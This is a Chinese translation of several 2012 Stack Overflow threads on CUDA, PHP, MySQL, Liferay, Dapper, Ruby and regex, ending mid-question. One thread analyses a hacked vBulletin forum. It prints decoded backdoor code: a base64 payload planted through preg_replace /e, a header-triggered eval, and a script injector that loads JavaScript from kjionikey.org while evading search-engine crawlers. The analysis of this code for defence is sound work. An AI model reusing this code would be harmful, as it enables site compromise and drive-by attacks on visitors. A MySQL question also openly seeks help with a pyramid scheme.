内核参数存储在片上共享内存中。如果线程尝试访问同一个存储区，共享内存可能会发生存储区冲突。 **所以我的问题是**：这是否意味着使用内核参数线程会导致银行冲突？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-11T16:13:56.960

不，因为访问总是统一的：（计算能力 1.x 半）warp 的所有线程将同时读取相同的参数，在一次传输中广播给所有线程。

为了完整起见，我将提到只有计算能力 1.x 的设备将参数存储在共享内存中。更高计算能力的设备将它们存储在恒定内存中，其中适用相同的均匀性推理。

# outlook - 通过电子邮件发送指向 Outlook 中新创建的 Dynamics CRM 帐户的直接链接

> ID：12839610
> 
> 赞同：3
> 
> 时间：2012-10-11T12:31:55.583
> 
> 标签：outlook, dynamics-crm-2011

我正在创建一个基于 Web 表单的应用程序，它在 MS Dynamics CRM 2011 中创建一个帐户。如果一切正常并且成功创建了帐户，我想向经理发送一封电子邮件，其中包含指向新创建的帐户。

目前我正在使用类似的东西：`https://mycrm.com/main.aspx?etc=1&id=%7B2FCE55B6-9513-E211-BAA7-001DD8B71E5F%7D&pagetype=entityrecord`. 但是，如果我将此链接放入电子邮件中，它将打开一个新的浏览器窗口来查看该页面。客户使用 Outlook 中的 CRM，所以我想知道是否有办法使用生成的链接将 Outlook 直接发送到创建的帐户？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-07T08:16:27.187

也许您应该重新考虑您（您的客户）的工作流程。为什么你首先要发送电子邮件？如果是因为您希望经理对帐户执行某些操作（确认、批准、接受、审核等），那么您可能应该考虑创建一个名为“审核新帐户”的任务。您可以将该任务分配给经理，这将在 Outlook 中提供指向该帐户的“链接”。您还可以跟踪任务的完成情况并采取行动，例如将“帐户状态”从“审核中”更改为“活动”。它只是一个想法。IMO 您应该远离在内部使用电子邮件，因为它们很难在 CRM 中采取行动。

# iphone - 存储购买状态的应用内购买

> ID：12839619
> 
> 赞同：0
> 
> 时间：2012-10-11T12:32:27.720
> 
> 标签：iphone, ios, in-app-purchase, xcode4.3

我正在对我的 iPhone 应用程序实施应用程序内购买。我正在关注本教程[http://xcodenoobies.blogspot.com/2012/04/implementing-inapp-purchase-in-xcode.html](http://xcodenoobies.blogspot.com/2012/04/implementing-inapp-purchase-in-xcode.html)并且一切正常。

但在上述教程中，购买状态是保存在 Phone KeyChain Utility 中。我们只能购买一次。

第二次下载应用程序时，它以购买状态安装。

在应用内购买中，Apple ID 或 Device 或两者都应该是唯一的？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:36:03.433

是的，如果您将产品创建为非消耗品，那么它只允许购买一次。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T15:51:28.493

无论是在设备上还是在 iTunes Connect 中，我都没有发现任何撤销购买非消耗性产品的可能性。因此，您必须使用消耗品测试您的应用内购买，或者您需要在 iTunes Connect 中删除您的测试用户并注册一个新用户。

# c# - 解析 CAML xml 的算法

> ID：12839621
> 
> 赞同：0
> 
> 时间：2012-10-11T12:32:31.250
> 
> 标签：c#, xml, sharepoint-2010, caml

我有一个特殊的要求来解析 Sharepoint CAML 并产生其他东西。第一个场景是生成一个 SQL 查询。

解析 XML 时是否有任何最佳实践开发工具/算法？我正在考虑使用 Linq To Xml 作为我的工具。但不确定这种类型的解析是否有更好的方法。

我喜欢的另一种方法是 OpenXML SDK 使用的方法，他们围绕 Open XML 格式构建了强类型引擎。也许我可以构建类似的东西，但它可能有点牵强。

任何帮助（可能是以前的 xml 解析经验）将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-19T11:43:48.610

在读取任何格式的任何结构时，都必须找到最优的遍历机制。在这种情况下，由于 CAML 逻辑操作是二元的（只有 2 个孩子），因此可以采用特定的遍历机制。Linq to XML 是一个强大的 XML 遍历工具。

# php - PHP匿名函数变量作为参考

> ID：12839622
> 
> 赞同：1
> 
> 时间：2012-10-11T12:32:30.870
> 
> 标签：php, function, reference, anonymous-function

在使用 Laravel 框架时，更具体地说 - 表单宏，我偶然发现了一个奇怪的错误。

起初，我认为 Laravel 有问题，但后来我断章取意：

```
<?php

// placeholder function that takes variable as reference
$function = function(&$reference)
{
    // append to variable
    $reference = $reference . ':' . __METHOD__;
};

// test with straight call
$variable = 'something';
$function($variable);
echo $variable;

// test with call_user_func(), that gets called in Laravels case
$variable = 'something'; // reset
call_user_func($function, $variable);
echo $variable; 
```

当第一次调用`$function`正确执行时，第二次尝试使用`call_user_func()`, 产生（摘自 Codepad）：

```
Warning: Parameter 1 to {closure}() expected to be a reference, value given
PHP Warning: Parameter 1 to {closure}() expected to be a reference, value given 
```

小提琴：[键盘@ Viper-7](http://codepad.viper-7.com/vknzNO)

在写这篇文章时，我想到了`call_user_func_array()`：[fiddle here](http://codepad.viper-7.com/ay57d8)，但产生了同样的错误。

我对引用有什么问题还是这是 PHP 的错误？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-11T12:37:13.690

我将其称为 PHP 的错误，尽管从技术上讲它是`call_user_func`. 文档确实提到了这一点，但可能不是以非常有启发性的方式：

> 请注意，for 的参数`call_user_func()`不是通过引用传递的。

可能更清楚地说，*参数`call_user_func()`不是通过引用传递的*（但请注意，从技术上讲，根本不需要说任何东西；这些信息也嵌入在函数签名中）。

无论如何，这意味着当`call_user_func`最终调用其目标可调用对象时，`ZVAL`正在传递的参数的（所有类型值的 PHP 引擎内部数据结构）不会被标记为“作为引用”；闭包在运行时检查它并抱怨，因为它的签名说参数必须是一个引用。

在 PHP < 5.4.0 中，可以通过使用调用时按引用传递来解决此问题：

```
 call_user_func($function, &$variable); 
```

但这会产生一个`E_DEPRECATED`警告，因为调用时按引用传递是一个已弃用的功能，并且会在 PHP 5.4 中导致致命错误，因为该功能已被完全删除。

结论：这种方式没有很好的使用`call_user_func`方式。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-12T01:33:21.997

这有效：

```
call_user_func_array($function, array(&$variable)); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-13T03:23:47.823

我用了这段代码

```
<?php
$myfunction = function &($arg=3)
{
    $arg = $arg * 2;
    return $arg;
};
echo $myfunction();
?> 
```

像魅力一样工作。:)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-11T12:39:23.257

如果你这样做会发生什么？

```
call_user_func($function, &$variable); 
```

# php - 创建和优化mysql查询，php

> ID：12839624
> 
> 赞同：1
> 
> 时间：2012-10-11T12:32:37.183
> 
> 标签：php, mysql, zend-framework

难以创建质量和优化 mysql 查询。让我们创建一个包含值的表。

```
CREATE TABLE flow
(
 US1 varchar(20), 
 US2 varchar(30)
);

INSERT INTO flow
(US1, US2)
VALUES
('rasim', 'tere1'),
('rasim', 'tere2'),
('rasim', 'tere3'),
('rasim', 'tere4'),
('tere1', 'tere5'),
('tere1', 'tere6'),
('tere2', 'tere7'),
('tere3', 'tere8'),
('tere3', 'tere9'),
('tere4', 'tere10'),
('tere5', 'tere11'),
('tere5', 'tere12'),
('tere9', 'tere13'),
('tere9', 'tere14'); 
```

我想要达到的目标：

```
$firstUs = DB::query("SELECT US2 FROM `flow` WHERE US1='rasim'");

while($first = DB::fetch($firstUs)):

$second =(int) // select and count(US2) foreach value where US1 = $first['US2'];

$third =(int) //select and count(US2) foreach value where US1 = $second['US2'];

$four = (int) //select and count(US2) foreach value where US1 = $third['US2'];

endwhile; 
```

$firstUs = 返回 4 个值（ tere1, tere2, tere3, tere4 ）。我希望脚本计算这些值中的每一个，即来自 US1 的条目数。$second = 返回 2 个值（ tere5, tere6 ）。在第一个 php while 循环中，计数值为 (2)。如何创建一个好的 mysql 脚本以便它可以工作，如果有很多用户访问这个页面，服务器不会崩溃并且查询速度会低得多。

谢谢

我正在努力实现金字塔计划。其中“rasim”是主要用户名。其中 $second 、 $third 和 $four 是每个级别的 int 用户数。$second 将计算金字塔第二层的所有用户。

[示例图像它的外观。http://silverstream.ee/img/stack.PNG](http://silverstream.ee/img/stack.PNG)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:38:45.270

我认为它是这样的：

```
select f2.us1, count(f2.us2)
from flow f1
inner join flow f2
f1.us2=f2.us1
where f1.us1='rasim'
group by f2.us1 
```

我希望这是你想要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:54:53.907

我认为这里最好的选择是将数据分解成单独的表，这样您的主键（US1）就不会与同一个表中的“外键”（US2）相关。然后，您可以通过查询而不是大量循环来完成您尝试执行的操作。

不幸的是，我仍然不知道你到底想要完成什么，所以我不可能用你给出的内容创建一个示例场景。

# php - HTTP-SOVIET 和 HTTP-PACK？

> ID：12839626
> 
> 赞同：4
> 
> 时间：2012-10-11T12:32:40.557
> 
> 标签：php, security, vbulletin

我发现我管理的几个 vBulletin 网站最近被黑了。他们使用最新版本的 3.8 系列（3.8.7 Patch Level 2）。我通常很擅长找到他们进入的洞并修补它们，但这个让我很难过。他们将数据注入 MySQL 表中。攻击总是在他们向`faq.php`脚本发出 GET 请求时发生。当攻击发生时，我能够保存数据。这是`$_REQUEST`, `$_GET`, `$_POST`, `$_COOKIE`, 和`$_SERVER`数组。我看到的唯一不合适的地方是有两个新`$_SERVER`键，`HTTP_SOVIET`并且`HTTP_PACK`：

[http://pastebin.com/b6WdZtfK](http://pastebin.com/b6WdZtfK)

我不得不假设这是问题的根源，但我一辈子都无法弄清楚攻击者如何设置这个变量。请求字符串中没有任何内容，cookie 数组中没有任何内容，这是一个 GET 请求，而不是 POST。

任何想法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:37:41.540

`$_SERVER['HTTP_*']`只需向 HTTP 请求添加标头即可设置变量 like 。

一个简单的命令行示例是：

PHP页面：

```
print_r($_SERVER); 
```

然后在命令行上：

```
curl --header "SOVIET: 123" localhost 
```

你会看到`$_SERVER['HTTP_SOVIET']`等于`123`。

在这种情况下，HTTP_SOVIET 的内容是 base64 编码的（放弃，它以 结尾`==`）。未编码，它变成：

```
function iai() {
global $db;
$base = base64_decode('JExLZ1RMSEs9KCRPX3JaeGw9IlxceDYyIi4iXFx4NjEiLiJcXHg3MyIuIlxceDY1Ii4iXFx4MzYiLiJcXHgzNCIuIlxceDVmIi4iXFx4NjQiLiJcXHg2NSIuIlxceDYzIi4iXFx4NmYiLiJcXHg2NCIuIlxceDY1ImFuZCRldFZKT1ZPPSJcXHg3MCIuIlxceDcyIi4iXFx4NjUiLiJcXHg2NyIuIlxceDVmIi4iXFx4NzIiLiJcXHg2NSIuIlxceDcwIi4iXFx4NmMiLiJcXHg2MSIuIlxceDYzIi4iXFx4NjUiKT9AJGV0VkpPVk8oIlxceDJmXFx4MmVcXHgyZlxceDY5XFx4NjUiLCRPX3JaeGwoIlFHVjJZV3dvWW1GelpUWTBYMlJsWTI5a1pTZ25XbTVXZFZrelVuQmlNalJuVTBkU01GRnRiRWhXUlVaNVMwTnJaMlYzTUV0YU1uaDJXVzFHYzBsRFVuQmpSamswVDNjd1MwcEhXbkJpUjFabVdrTkJPVWxEWTNaa1J6RjNURE5DYjJOR2JGTlpNRTVEWWxWS2VVcDZjMDVEYVZKd1kwWTVjMGxFTUdkTFNFNHdZMjFzZFZwNWJIQmpSRXB6WWpJMWJrdERVbkJqUmprMFMxUnpUa050YkcxTFIxcHdZa2RXWmxwWWFIQmpNMUo2UzBOU2JXRlhlR3hZTWxGd1NVZEdkVnBEUWtGaFdFNW1aRE5LY0dSSFJtbGlSMVZ2U2tkYWNHSkhWbVphUTJ0bldWYzFhMGxEWjI5S1NFNXdaVzFXWmxwcFFUbEpSVUp0WVZkNGJHTXliRFphVTJkcldtMXNjMXBXT1d0TFUydG5VR2xCZDB0VGEyZGxkekJMU1VOU2ExbFlVbWhKUkRCbldtMXNjMXBXT1c1YVdGSm1XVEk1ZFdSSFZuVmtTRTF2U2tkYWNHSkhWbVphUTJzM1JGRnZaMkZYV1c5S1NFNXdaVzFXWmxwcFFTdEpSRVYzVFVSQmQwMUVRWEJKUjFwd1lrZFdabU5JVmpCWU1rNTJZbTVTYkdKdVVucExRMUp0WVZkNGJGZ3lVWE5pV0ZKbVkyMUdkVnBEWjNoTlJFRnpUMVJyTlV0VE5HNU1RMk53VDNjd1MwbERRbkJhYVdkb1l6TlNlV0ZZVGpCamFXZHJXa2RHTUZsVGQydGhXRUptWWtOcmNFbEljMDVEYVVGblNVZGFjR0pIVm1aalNGWXdXREpPZG1KdVVteGlibEo2UzBOU2JXRlhlR3hZTWxGelNXbFNjR05HT1hOTVEwbHpVbXRzVFZKV09VSlZSa0pHVkd0UmNFOTNNRXRKUTBJNVNVZFdjMk15VldkamJWWXdaRmhLZFVsSVVubGtWMVUzUkZGdloyWlJNRXRtVVRCTFdtNVdkVmt6VW5CaU1qUm5VekpXU1ZOSFVuQlhSWGR2U2tkc2RVdFRRamRFVVhCdVlrYzVhVmxYZDJkS1NGcHBaRmQ0YzFwWVVuQmlhWGRyWVZoQ1ptVkVjMDVEYVZKcllqSXhhR0ZYTkdkUVUwRnVZVEp3Y0dJeU5YQmhNbFkxVEcwNWVWcDVZemRFVVc5cldtMXNkVnBHT1hSYVUwRTVTVU5rTWxsdVZuTmlSMVl3WVZjMVptSlhWblZrVXpWeFkzbzVNbEJVVFRST2VVa3JVRU01ZWxrelNuQmpTRkVyU25welRrTnBVbnBhVjAxblVGTkJibFV5TlVOYVIyaFRVVlp3VTFsclpEQmpiRGh1VDNjd1MwcEhkR3hsVTBFNVNVaE9NVmx1VGpCamFXaDBXa1JWYjBwR09WUlNWa3BYVWxaS1lrb3dhRlZXUmtKbVZsWk9SbFZzT1VKU01GWlBWa05rWkV4cFVuQmpSamswVEdsU2VscFhUWEJNUkVGelRWUlpjRTkzTUV0S1NGWjVZa05CT1VsSE1UQllNMHBvWW0xUmIwMVVRWGRNUkdzMVQxUnJOVTlUYTNWS2VUVnhZM280ZVU1VVFURk9hbWR0U25rMGEyRXlWalZQZHpCTFkyMVdNR1JZU25WSlEyZHJZak5XTUVsRU1HZGpNMUo1V0ROS2JHTkhlR2haTWxWdlNrZGFjR0p0VW1aaVYxVnpTa2RhY0dKdFVtWmlWMVYxU1d4NGVWaEhORGhqTWs1NVlWaENNRWxJVWpWalIxVTVXRU5LTUZwWWFEQk1NbkJvWkcxR2Vsa3pTbkJqU0ZKalNXbENlbU50VFRsWVEwcHZaRWhTZDA5cE9IWktSMUoyWWxkR2NHSnBPR3RrV0VweldFTkpLMUJET1hwWk0wcHdZMGhSSzBscGQydGhWelJ3UzFOQkwwbERVblprV0ZGblQybEJhMkZYTkRkRVVYQTVSRkZ3YldSWE5XcGtSMngyWW1sQ1IyVnJkREZWUjFwd1VWVmpiMHRUUWpkRVVXOXJZVmhCWjFCVFFXNUtlbk5PUTIxc2JVdERSbXhpV0VJd1pWTm5hMWd4VGtaVmJGcEdWV3h6YmxOR1VsVlZSamxaV0RCYVVGVnNaRUpWYTFKR1VrWTVSMVF4U1c1WVUydHdTVWh6VGtOcFFXdFpXRXA1U1VRd1oxcFlhSGRpUnpscldsTm5ia3hEWTNOS1JqbFVVbFpLVjFKV1NtSktNR2hWVmtaQ1psZEdPVWRVTVVwWVVWWktSVkpWVW1aU2F6bFRTakV3Y0U5M01FdEpRMEp3V21sb2QyTnRWbTVZTWpGb1pFZE9iMHREWTNaWWJIaHJaWHBGYzAwek1XTk1iSGhyWlhwRmMwMHpNV05NYkhoclpYcEZjMDB6TVdOTWJIaHJaWHBGYzAwek1HdE1lV056U2tkR2VXTnNjMjVOUTJSa1MxTnJaMlYzTUV0SlEwRm5Ta2RzZDBsRU1HZEtSMFo1WTJ4emJrMURaR1JQZHpCTFNVTkNPVVJSY0RsRVVYQjVXbGhTTVdOdE5HZExRMFpzWWxoQ01HVlRaMnRoV0VGd1MxTkJMMGxEVW5CalEwRTJTVU5TWmxVd1ZsTldhMVpUVjNsa1UxSlZNVkJXUlZabVVWVlNSVlZwWkdSUGR6QkxabEV3UzFwdVZuVlpNMUp3WWpJMFoxRllRbVpoUm5CRldIbG5jRWxJYzA1RGJXeHRTMGhDZVZwWFpHWmlWMFl3V1RKbmIwcDVUbTVpTWpsdVlrZFdPR0pZVG5WbVIzaHdaRzFXT0ZsWGVEQlpXRnB3WXpOU2FHWkhSbnBoTTNnMVdWZG9kbUl6ZUdoaU1uZzRXVzFzZFZvemVHeGxSMFp6V2xkR2EyWkhWalJaTW13d1dsaDRjMlZYVG5aak0zaDBaVmhPZDFsWFRteG1SMFp6V2xob2FHWkhVblprVjBweldsZE9jMkZYVG5KSk1tdHVURU5TWmxVd1ZsTldhMVpUVjNsa1NWWkdVbEZZTVVwR1VtdFdVMUpXU1c1WVUydHdTVWh6VGtOcFFuQmFhV2gzWTIxV2JsZ3lNV2hrUjA1dlMwTmphbUpZVG5CYVdIaHRZVmhLYkZwdE9UUm1SemwzV2xoS2FHWkhUbTlqYlRsMFdsTk9jRXA1ZDJ0WU1VNUdWV3hhUmxWc2MyNVRSbEpWVlVZNVZsVXdWbE5ZTUVaSVVsVTFWVW94TUhCTFUwSjVXbGhTTVdOdE5HZGtTRW94V2xSelRrTnBRamxFVVhBNVJGRndiV1JYTldwa1IyeDJZbWxDZGxSV2JGcFVNa1o1UzBOcloyVjNNRXRhTW5oMldXMUdjMGxEVW5CalJqazBUM2N3UzBwSGJIZFlNMmRuVUZOQ1IyVnJkREZWUjFwd1VWVmpiMHRVYzA1RGFWSm9TVVF3WjFsWVNubFpXR3R2U25wSmVFNXBOSGxOZW10MVNubDNiazFxUVRWTWFtY3hUR2xqYzBwNlJUTk5lVFI1VGxSVmRVcDVkMjVOVkdONlRHcEZOVTVETkc1TVEyTTBUMU0wZVUxRVkzVktlWGR1VG5wUmRVMVVTVEZNYVdOelNucGplVXhxUlRCTWFXTnpTbnBaTWt4cVNUQlBVelJ1VEVOak1rNXBOSGhOUkVsMVNubDNiazVxVVhWTmFrMTZUR2xqY0U5M01FdGFiVGw1V2xkR2FtRkRaMnRaVTBKb1kzbEJhMWxwYTJkbGR6QkxTVWRzYlV0SVFubGFWMlJtWWxkR01Ga3laMjlKYVRsbFNrZEpkbUZUU1hOS1IyeDNXRE5uY0V0VFFubGFXRkl4WTIwMFoyUklTakZhVkhOT1EybENPVVJSY0RsRVVYQndXbWxuYUZwWE1YZGtTR3R2U2tZNVZGSldTbGRTVmtwaVNqQm9WVlpHUW1aVmExWkhVbFpLUmxWcFpHUkxVMnRuWlhjd1MwbEhiRzFMUlVaM1dESm9ZVkpHT0c5TFUwSm9ZbTFSWjBsWE9VNVhWbXhRV1ZoSmIwdFRRbWhpYlZGblNWVm9hMlJGU25CU01WSkNZMmxuY0V0VFFqZEVVVzluU2tjMWJHUXpVbXhsU0ZGblVGTkNURnBWYUVsYVIyeFpWRU5uYTJKdFZqTmtSMVkwWkVOck4wUlJiMmRtVVRCTFpsRXdTMk50VmpCa1dFcDFTVU5TZFZwWVpEQmFXR2d3VDNjOVBTY3BLVHM9IiksIi4iKTpudWxsOw=='); 
$style = $GLOBALS['style'];
if(!empty($style['styleid'])) {
 $a = $db->query_first('select styleid from '.TABLE_PREFIX.'style where styleid=\''.$style['styleid'].'\'');
  if($a['styleid']!='' and $a['replacements']=='') {
   $db->query_write('update '.TABLE_PREFIX.'style set replacements=\'a:1:{s:12:"/^(.*?)$/ise";s:'.(strlen($base)-30).':"'.$base.'";}\' where styleid=\''.$style['styleid'].'\'');
   echo 'ok';
  } else echo 'error';
}
exit;
}
@iai(); 
```

值得注意的是那里的查询：

```
'update '.TABLE_PREFIX.'style set replacements=\'a:1:{s:12:"/^(.*?)$/ise";s:'.(strlen($base)-30).':"'.$base.'";}\' where styleid=\''.$style['styleid'].'\'' 
```

检查您的样式表，因为这是向用户公开代码的一种方式/方式。

将您的样式表重命名为其他名称可能会暂时减轻这种攻击的影响。

在那里，base64 位有更多的 bas64，其中有更多的 bas64 最终评估：

```
function HdtBiGTAr() {
global $ip_x;
$file_d = '/tmp/phpYRcCBmBr';
$ip_l = (string)ip2long($ip_x);
if(file_exists($file_d) and @is_writable($file_d) and (($size_f = @filesize($file_d)) > 0)) {
 $data = file_get_contents($file_d);
 if($size_f > 1000000) file_put_contents($file_d,mt_rand(100,999).',');
  if(!stristr($data,$ip_l)) {
   file_put_contents($file_d,"$ip_l,",FILE_APPEND);
  } else return true;
 }
}
function KeHHdiXL($in) {
global $vbulletin,$ip_x;
$domain = 'kjionikey.org';
$find_me = 'vbulletin_menu.js?v=387"></script>';
$sec = 'SnBdhRAZRbGtr_';
$key = substr(md5($_SERVER['HTTP_USER_AGENT'].$ip_x.$sec),0,16);
$url = mt_rand(100,999999).'.js?250568&'.$key;
return ($out = str_replace($find_me,$find_me."\r\n<script type=\"text/javascript\" src=\"http://$domain/$url\"></script>",$in)) ? $out : $in;
}
function FzKuPfiAG() {
$ip = '';
if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
 $arr = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
  if(preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/',$arr['0'])) {
   $ip = $arr['0'];
  }
}
return (!empty($ip)) ? $ip : $_SERVER['REMOTE_ADDR'];
}
function Ap_hZD_() {
if(preg_match('#google|msn|live|altavista|ask|yahoo|aol|bing|exalead|excite|lycos|myspace|alexa|doubleclick#i',$_SERVER['HTTP_REFERER'])) {
 if(preg_match('#msie|firefox|opera|chrome#i',$_SERVER['HTTP_USER_AGENT'])) return true;
 }
}
function oMYYOar() {
global $ip_x;
$ip_x = FzKuPfiAG();
$a = array('216.239.','209.85.','173.255.','173.194.','89.207.','74.125.','72.14.','66.249.','66.102.','64.233.');
foreach($a as $b) {
 if(preg_match("/^$b/i",$ip_x)) return true;
 }
}
if(!empty($_SERVER['HTTP_REFERER'])) {
 if(Ap_hZD_() and !oMYYOar() and !HdtBiGTAr()) {
 $newtext = KeHHdiXL($newtext);
 }
}
return $newtext; 
```

这会写入一个名为 的文件`/tmp/phpYRcCBmBr`，所以我会检查它的内容。

它还向搜索引擎隐藏了它的行为，这很好。

对用户不利的地方可能是：

```
function KeHHdiXL($in) {
global $vbulletin,$ip_x;
$domain = 'kjionikey.org';
$find_me = 'vbulletin_menu.js?v=387"></script>';
$sec = 'SnBdhRAZRbGtr_';
$key = substr(md5($_SERVER['HTTP_USER_AGENT'].$ip_x.$sec),0,16);
$url = mt_rand(100,999999).'.js?250568&'.$key;
return ($out = str_replace($find_me,$find_me."\r\n<script type=\"text/javascript\" src=\"http://$domain/$url\"></script>",$in)) ? $out : $in;
} 
```

这会将一些 JS 放在由`kjionikey.org`. 该 JS 需要基于 IP 地址的密钥。

我会检查任何读取/执行随机 $_SERVER 变量内容的代码，但我不知道为什么会在那里。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-13T12:43:27.920

在这种情况下，攻击者在您的一个常见问题解答短语（vbulletin db 表）中安装了一个后门代码，`phrases`作为一组`chr()`PHP 函数调用。

```
${$GeAZvLDI=chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(95) ... 
```

基本上，当通过 faq.php 脚本进行评估时，会被解码为：

```
if(!empty($_SERVER['HTTP_PACK']) and !empty($_SERVER['HTTP_SOVIET']))
{
    if(md5(md5($_SERVER['HTTP_PACK'])) == 'rDGeOKeGGdiVLFy')
        @eval(base64_decode($_SERVER['HTTP_SOVIET']));
} 
```

您可以通过发出这样的 SQL 查询来找到受影响的 vBulletin 短语

```
SELECT varname, text FROM `phrase` where text like '%chr(%'; 
```

虽然有很多变体，但有些使用 HEX 字符串、base64decode、断言、打包调用或只是普通的 PHP。

# liferay - 从数据库访问角色数据

> ID：12839633
> 
> 赞同：0
> 
> 时间：2012-10-11T12:32:57.937
> 
> 标签：liferay, liferay-6

在 liferay 中，我正在尝试使用 API 访问数据库中可用的角色数据。

我正在使用 com.liferay.portal.service.RoleLocalServiceUtil 类来访问角色。下面是我的代码：

```
Role role = RoleLocalServiceUtil.getRole(10138);
ans = ans+role.getName()+","+role.getRoleId(); 
```

数据库中存在 ID 为 10138 的角色。

但是上面抛出了以下异常： com.liferay.portal.kernel.bean.BeanLocatorException: BeanLocator has not been set com.liferay.portal.kernel.bean.PortalBeanLocatorUtil.locate(PortalBeanLocatorUtil.java:33) com.liferay.portal .service.RoleLocalServiceUtil.getService(RoleLocalServiceUtil.java:446) com.liferay.portal.service.RoleLocalServiceUtil.getRole(RoleLocalServiceUtil.java:166) com.bl.retail.controller.KPIController.changeAccess(KPIController.java:70) sun .reflect.NativeMethodAccessorImpl.invoke0(Native Method) sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) ..........

如何设置 BeanLocator？我花了这么多愚蠢的时间，请帮助！

PS：上面的代码来自运行在同一个liferay服务器上的一个单独的servlet。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:53:13.420

`ClassLoader classLoader = (ClassLoader)PortletBeanLocatorUtil.locate(ClpSerializer.SERVLET_CONTEXT_NAME,"portletClassLoader");`
在调用 getter 之前尝试添加。见[http://www.liferay.com/zh/community/forums/-/message_boards/message/13302979](http://www.liferay.com/zh/community/forums/-/message_boards/message/13302979)和[http://liferay-blogging.blogspot.de/2011/03/dynamicquery-api-and-classloaders-in .html](http://liferay-blogging.blogspot.de/2011/03/dynamicquery-api-and-classloaders-in.html)供参考。

希望对你有帮助，问候

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-16T08:23:49.930

回答我自己的问题：

这是因为角色数据访问是从另一个 Servlet 完成的。

当我在 portlet 中使用相同的代码时，它工作得很好。

# c# - 是否有更好/更快的方式来访问原始数据？

> ID：12839635
> 
> 赞同：3
> 
> 时间：2012-10-11T12:33:05.457
> 
> 标签：c#, asp.net

这与特定问题无关，而是关于“最佳实践”的问题。

一段时间以来，当我需要直接从数据库中获取数据时，我一直在使用以下方法 - 我想知道是否有一种我不知道的更快的方法？

```
DataTable results = new DataTable();
using (SqlConnection connection = new SqlConnection(ConfigurationManager.ConnectionStrings["Name"]))
{
    connection.Open();
    using (SqlCommand command = new SqlCommand("StoredProcedureName",connection))
    {
      command.CommandType = CommandType.StoredProcedure;
      /*Optionally set command.Parameters here*/
      results.Load(command.ExecuteReader());
    }
}
/*Do something useful with the results*/ 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:52:25.947

确实有多种读取数据的方法；`DataTable`是一个相当复杂的野兽（支持许多复杂的场景——引用完整性、约束、计算值、动态额外列、索引、过滤等）。在很多情况下，您*不需要所有这些*；你只想要数据。为此，一个简单的对象模型可以在内存和性能方面更有效。您可以围绕 编写自己的代码`IDataReader`，但这是一个已解决的问题，有一系列工具可以为您做到这一点。例如，您可以通过[dapper](http://nuget.org/packages/Dapper)做到这一点，只需：

```
class SomeTypeOfRow { // define something that looks like the results
    public int Id {get;set;}
    public string Name {get;set;}
    //..
}
...
var rows = connection.Query<SomeTypeOfRow>("StoredProcedureName",
    /* optionalParameters, */ commandType: CommandType.StoredProcedure).ToList(); 
```

然后非常有效地填充 a `List<SomeTypeOfRow>`，而没有所有`DataTable`开销。此外，如果您正在处理大量数据，您可以以完全流式方式执行此操作，因此您不需要在内存中缓冲 2M 行：

```
var rows = connection.Query<SomeTypeOfRow>("StoredProcedureName",
    /* optionalParameters, */ commandType: CommandType.StoredProcedure,
    buffered: false); // an IEnumerable<SomeTypeOfRow> 
```

为了完整起见，我应该解释一下`optionalParameters`；如果你想通过`@id=1`, `@name="abc"`，那就是：

```
var rows = connection.Query<SomeTypeOfRow>("StoredProcedureName",
    new { id = 1, name = "abc" },
    commandType: CommandType.StoredProcedure).ToList(); 
```

我想你会同意，这是一种描述参数的非常简洁的方式。这个参数完全是可选的，如果不需要参数可以省略。

作为额外的奖励，这意味着你可以免费获得强类型，即

```
foreach(var row in rows) {
    Console.WriteLine(row.Id);
    Console.WriteLine(row.Name);
} 
```

而不必谈论`row["Id"]`等等`row["Name"]`。

# ruby-on-rails - Rails 和 Ubuntu 报告不同的 ruby 版本

> ID：12839637
> 
> 赞同：0
> 
> 时间：2012-10-11T12:33:11.193
> 
> 标签：ruby-on-rails, ruby, ubuntu-12.04, chef-infra

我在开发时使用 Vagrant 和 Chef 创建新服务器。我想从 Ruby on Rails 开始，所以我正在设置一个服务器。一切正常，但 Ubuntu 和 Rails 报告了不同的 Ruby 版本。

Ubuntu 12.04：ruby -v = ruby​​ 1.9.3p0（2011-10-30 修订版 33570）[x86_64-linux]
Rails = 1.8.7（x86_64-linux）

我根本不想在系统上安装 Ruby 1.8.7，但我无法摆脱它。无论如何设置默认的Ruby版本？

我不想顶级使用 RVM 或类似的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:37:24.393

试试这个`aptitude purge ruby`

然后安装最新版本或者你想要的版本

在 stackoverflow 中看到这篇文章 [如何使 Ruby 1.9 成为 Ubuntu 上的默认 Ruby？](https://stackoverflow.com/questions/1892877/how-do-i-make-ruby-1-9-the-default-ruby-on-ubuntu)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T14:55:23.800

这成功了。

[https://github.com/royratcliffe/VagrantBaseBoxes](https://github.com/royratcliffe/VagrantBaseBoxes)

# javascript - 为以下值创建正则表达式

> ID：12839638
> 
> 赞同：1
> 
> 时间：2012-10-11T12:33:12.883
> 
> 标签：javascript, regex

我想创建一个正则表达式，以便它可以接受以下值：-

```
100, 100.00, (100),(100.00),$100, $100.00, $(100), $(100.00) 
```

我成功地构建了以下正则表达式：-

```
